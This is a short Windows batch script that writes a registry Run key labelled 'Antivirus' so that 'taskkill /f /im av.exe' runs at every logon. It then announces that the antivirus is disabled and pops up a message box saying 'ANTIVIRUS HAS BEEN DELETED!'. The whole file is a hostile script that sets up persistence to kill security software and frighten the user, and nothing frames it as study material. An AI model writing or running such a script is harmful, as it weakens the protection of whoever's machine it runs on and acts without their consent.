@echo off
echo Disabling Antivirus...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Antivirus" /t REG_SZ /d "taskkill /f /im av.exe" /f
echo Antivirus disabled!
echo x=msgbox("ANTIVIRUS HAS BEEN DELETED!", 0+64, "WARNING") > temp.vbs
cscript temp.vbs
del temp.vbs
pause
